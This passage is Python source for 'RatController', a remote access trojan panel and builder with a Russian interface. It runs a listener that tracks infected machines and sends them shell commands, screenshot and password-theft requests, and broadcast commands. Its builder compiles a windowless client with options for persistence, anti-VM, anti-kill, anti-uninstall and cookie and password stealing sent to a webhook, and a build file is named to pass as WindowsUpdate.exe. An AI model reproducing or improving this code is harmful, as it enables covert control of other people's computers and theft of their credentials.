        btn_frame = tk.Frame(frame, bg="#1e1e1e")
        btn_frame.pack(fill=tk.X, pady=10)
        
        tk.Button(btn_frame, text="Руководство по безопасному режиму", command=self.show_safe_guide, 
                 bg="#4CAF50", fg="white").pack(side=tk.LEFT, padx=5)
        
        tk.Button(btn_frame, text="Получить Webhook", command=self.get_webhook, 
                 bg="#2196F3", fg="white").pack(side=tk.LEFT, padx=5)
        
        tk.Button(btn_frame, text="Открыть документацию", command=self.open_docs, 
                 bg="#FF9800", fg="white").pack(side=tk.LEFT, padx=5)
    
    def show_safe_guide(self):
        messagebox.showinfo("Безопасный режим",
            "Безопасный режим (Safe Mode):\n"
            "• Не добавляет в автозагрузку\n"
            "• Не скрывает окно клиента\n"
            "• Выводит все действия в консоль\n"
            "• Снижает нагрузку на систему\n"
            "• Легко удаляется через крестик\n\n"
            "Используйте для тестирования на основном ПК!")
    
    def open_docs(self):
        webbrowser.open("https://example.com/docs")
    
    def get_webhook(self):
        webbrowser.open("https://webhook.site/")
        messagebox.showinfo("Получить Webhook", 
            "Откройте webhook.site и скопируйте ваш уникальный URL\n"
            "Вставьте его в поле 'Webhook URL' в настройках билдера")
    
    def save_settings(self):
        messagebox.showinfo("Настройки сохранены", "Настройки успешно сохранены!")
    
    def restore_defaults(self):
        self.server_port.set(7777)
        self.max_clients.set(100)
        self.auto_clean.set(True)
        self.auto_start.set(False)
        self.encrypt_exe.set(False)
        messagebox.showinfo("Настройки сброшены", "Настройки восстановлены по умолчанию!")
    
    # ========== СЕРВЕР ==========
    def start_server(self):
        self.server_thread = threading.Thread(target=self.run_server, daemon=True)
        self.server_running = True
        self.server_thread.start()
        self.log("[*] Сервер запущен на 0.0.0.0:7777")
        self.log("[*] Для локальных тестов используйте IP: 127.0.0.1")
        self.log("[*] Для внешнего доступа настройте playit.gg")
        self.server_status.config(text="Server: Running", fg="green")
    
    def run_server(self):
        HOST = '0.0.0.0'
        PORT = 7777
        
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((HOST, PORT))
            s.listen()
            
            while self.server_running:
                try:
                    conn, addr = s.accept()
                    self.log(f"[+] Новое подключение от {addr[0]}:{addr[1]}")
                    client_thread = threading.Thread(target=self.handle_client, args=(conn, addr))
                    client_thread.start()
                except:
                    break
    
    def handle_client(self, conn, addr):
        try:
            while True:
                data = conn.recv(4096)
                if not data: break
                
                try:
                    # Пытаемся декодировать JSON
                    client_info = json.loads(data.decode())
                    self.add_client(conn, addr, client_info)
                except:
                    # Если не JSON, выводим как есть
                    self.cmd_output.insert(tk.END, f"{addr[0]}: {data.decode()}\n")
                    self.cmd_output.see(tk.END)
        except Exception as e:
            self.log(f"[!] Ошибка клиента: {str(e)}")
        finally:
            conn.close()
            self.log(f"[-] Подключение закрыто: {addr[0]}")
            self.remove_client(addr[0])
    
    # ========== ФУНКЦИОНАЛ КЛИЕНТОВ ==========
    def add_client(self, conn, addr, client_info):
        client_id = client_info.get("hwid", "N/A")
        self.clients[addr[0]] = {
            "conn": conn,
            "hwid": client_id,
            "os": client_info.get("os", "N/A"),
            "join_date": client_info.get("join_date", "N/A"),
            "ip": addr[0],
            "safe_mode": client_info.get("safe_mode", False),
            "is_vm": client_info.get("is_vm", False)
        }
        
        # Обновляем GUI в основном потоке
        self.root.after(0, self.add_client_to_table, addr[0], client_info)
    
    def add_client_to_table(self, ip, client_info):
        # Определяем страну по IP (демо)
        country = "UA" if random.random() > 0.5 else "RU"
        safe_status = "ДА" if client_info.get("safe_mode", False) else "НЕТ"
        vm_status = "ДА" if client_info.get("is_vm", False) else "НЕТ"
        
        self.tree.insert("", "end", values=(
            ip,
            country,
            client_info.get("hwid", "N/A"),
            safe_status,
            client_info.get("os", "N/A"),
            vm_status,
            client_info.get("join_date", "N/A")
        ))
        
        # Обновляем статус бар
        self.status.config(text=f"Клиентов: {len(self.clients)} | ВМ: {sum(1 for c in self.clients.values() if c['is_vm'])} | Безопасные: {sum(1 for c in self.clients.values() if c['safe_mode'])}")
    
    def remove_client(self, ip):
        if ip in self.clients:
            del self.clients[ip]
            
            # Удаляем из таблицы
            for child in self.tree.get_children():
                if self.tree.item(child, "values")[0] == ip:
                    self.tree.delete(child)
                    break
            
            self.status.config(text=f"Клиентов: {len(self.clients)} | ВМ: {sum(1 for c in self.clients.values() if c['is_vm'])} | Безопасные: {sum(1 for c in self.clients.values() if c['safe_mode'])}")
    
    def refresh_clients(self):
        # Проверяем активность клиентов
        for ip, client in list(self.clients.items()):
            try:
                client["conn"].send(b"ping")
            except:
                self.remove_client(ip)
    
    def get_selected_client(self):
        selection = self.tree.selection()
        if not selection:
            return None
            
        selected_item = self.tree.item(selection[0])
        ip = selected_item["values"][0]
        return self.clients.get(ip)
    
    def execute_selected(self):
        client = self.get_selected_client()
        if not client:
            return
            
        cmd = simpledialog.askstring("Выполнить команду", "Введите команду:")
        if cmd:
            try:
                client["conn"].send(f"cmd {cmd}".encode())
                self.log(f"[*] Команда отправлена {client['ip']}: {cmd}")
            except:
                self.log(f"[!] Ошибка отправки команды {client['ip']}")
    
    def screenshot_selected(self):
        client = self.get_selected_client()
        if client:
            try:
                client["conn"].send(b"screenshot")
                self.log(f"[*] Запрос скриншота от {client['ip']}")
            except:
                self.log(f"[!] Ошибка запроса скриншота {client['ip']}")
    
    def get_passwords(self):
        client = self.get_selected_client()
        if client:
            try:
                client["conn"].send(b"get_passwords")
                self.log(f"[*] Запрос паролей от {client['ip']}")
            except:
                self.log(f"[!] Ошибка запроса паролей {client['ip']}")
    
    def uninstall_selected(self):
        client = self.get_selected_client()
        if client:
            try:
                client["conn"].send(b"uninstall")
                self.log(f"[*] Отправлена команда самоудаления {client['ip']}")
            except:
                self.log(f"[!] Ошибка отправки команды самоудаления {client['ip']}")
    
    def uninstall_all(self):
        for ip, client in list(self.clients.items()):
            try:
                client["conn"].send(b"uninstall")
                self.log(f"[*] Отправлена команда самоудаления {ip}")
            except:
                self.log(f"[!] Ошибка отправки команды самоудаления {ip}")
    
    # ========== ФУНКЦИИ МЕНЮ ==========
    def stop_server(self):
        self.server_running = False
        # Принудительно закрываем сокет для выхода из accept()
        try:
            temp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            temp_socket.connect(('127.0.0.1', 7777))
            temp_socket.close()
        except:
            pass
        self.log("[*] Сервер остановлен")
        self.server_status.config(text="Server: Stopped", fg="red")

    # ========== ФУНКЦИОНАЛ БИЛДЕРА ==========
    def select_icon(self):
        file = filedialog.askopenfilename(filetypes=[("ICO files", "*.ico")])
        if file: self.icon_path.set(file)
    
    def log(self, message):
        self.console.insert(tk.END, message + "\n")
        self.console.see(tk.END)
    
    def open_build_dir(self):
        subprocess.Popen(f'explorer "{BUILD_DIR}"')
    
    def build_client(self):
        # Получение параметров
        port = int(self.port_entry.get())
        filename = self.filename_entry.get()
        icon_path = self.icon_path.get()
        file_extension = self.extension_entry.get()
        
        # Проверка опций
        if (self.steal_cookies.get() or self.steal_passwords.get()) and not self.webhook_url.get():
            messagebox.showwarning("Требуется Webhook", 
                "Для функций Steal Cookies/Passwords требуется указать Webhook URL!")
            return
            
        # Определение хоста
        host = self.ip_entry.get()
        self.log("[*] Используется IP: " + host)
        
        # Генерация кода клиента
        client_code = self.generate_client_code(host, port, file_extension)
        
        # Сохранение кода
        py_path = os.path.join(BUILD_DIR, "client_temp.py")
        with open(py_path, "w", encoding="utf-8") as f:
            f.write(client_code)
            
        # Команда сборки
        build_cmd = f'pyinstaller --noconsole --onefile --log-level=ERROR --noconfirm --clean'
        if icon_path:
            build_cmd += f' --icon="{icon_path}"'
        build_cmd += f' --distpath="{BUILD_DIR}"'
        build_cmd += f' --name="{filename}"'
        build_cmd += f' --add-data="browser_cookie3;browser_cookie3"'
        build_cmd += f' "{py_path}"'
        
        # Запуск сборки в отдельном потоке
        threading.Thread(target=self.run_build, args=(build_cmd, py_path, filename)).start()
        self.log("[*] Начало сборки клиента...")
        self.log(f"[>] Команда: {build_cmd}")
    
    def generate_client_code(self, host, port, file_extension):
        # Подставляем настройки в шаблон
        return CLIENT_TEMPLATE.replace("{SAFE_MODE}", str(self.safe_mode.get()).lower()) \
            .replace("{DEBUG_MODE}", str(self.debug_mode.get()).lower()) \
            .replace("{PERSISTENT}", str(self.persistent_mode.get()).lower()) \
            .replace("{HIDE_FILE}", str(self.hide_file.get()).lower()) \
            .replace("{ANTI_KILL}", str(self.anti_kill.get()).lower()) \
            .replace("{STEAL_COOKIES}", str(self.steal_cookies.get()).lower()) \
            .replace("{STEAL_PASSWORDS}", str(self.steal_passwords.get()).lower()) \
            .replace("{ANTI_VM}", str(self.anti_vm.get()).lower()) \
            .replace("{ANTI_UNINSTALL}", str(self.anti_uninstall.get()).lower()) \
            .replace("{WEBHOOK_URL}", self.webhook_url.get()) \
            .replace("{FILE_EXTENSION}", file_extension) \
            .replace("{HOST}", host) \
            .replace("{PORT}", str(port))
    
    def run_build(self, cmd, py_path, filename):
        try:
            # Запуск PyInstaller
            process = subprocess.Popen(
                cmd, 
                shell=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                text=True,
                encoding='utf-8',
                errors='replace'
            )
            stdout, stderr = process.communicate()
            
            if process.returncode == 0:
                self.log("[+] Сборка успешна!")
                self.log(f"[+] Клиент сохранен: {BUILD_DIR}\\{filename}.exe")
                
                # Автозапуск клиента после сборки
                if self.auto_start.get():
                    exe_path = os.path.join(BUILD_DIR, f"{filename}.exe")
                    if os.path.exists(exe_path):
                        subprocess.Popen([exe_path], creationflags=subprocess.CREATE_NO_WINDOW)
                        self.log("[+] Клиент автоматически запущен")
                
                # Удаление временных файлов
                if self.auto_clean.get():
                    temp_files = [
                        os.path.join(BUILD_DIR, "client_temp"),
                        os.path.join(BUILD_DIR, "build"),
                        py_path,
                        os.path.join(os.getcwd(), "WindowsUpdate.exe.spec")
                    ]
                    
                    for path in temp_files:
                        if os.path.exists(path):
                            if os.path.isdir(path):
                                shutil.rmtree(path, ignore_errors=True)
                            else:
                                try:
                                    os.remove(path)
                                except:
                                    pass
                
                # Информация о безопасном режиме
                if self.safe_mode.get():
                    self.log("[!] ВНИМАНИЕ: Клиент собран в безопасном режиме")
            else:
                self.log("[!] Ошибка сборки!")
                error_lines = [line for line in stderr.split('\n') if 'error' in line.lower()]
                self.log('\n'.join(error_lines[:10]))
                
        except Exception as e:
            self.log(f"[!] Критическая ошибка: {str(e)}")

    def execute_command(self):
        cmd = self.cmd_entry.get()
        if not cmd:
            return
            
        self.cmd_output.insert(tk.END, f">>> {cmd}\n")
        self.cmd_entry.delete(0, tk.END)
        
        # Отправка команды всем клиентам
        for ip, client in self.clients.items():
            try:
                client["conn"].send(f"cmd {cmd}".encode())
                self.cmd_output.insert(tk.END, f"[{ip}] Команда отправлена\n")
            except:
                self.cmd_output.insert(tk.END, f"[{ip}] Ошибка отправки\n")
        
        self.cmd_output.see(tk.END)

# ========== ЗАПУСК ПРИЛОЖЕНИЯ ==========
if __name__ == "__main__":
    root = tk.Tk()
    app = RatController(root)
    root.mainloop()
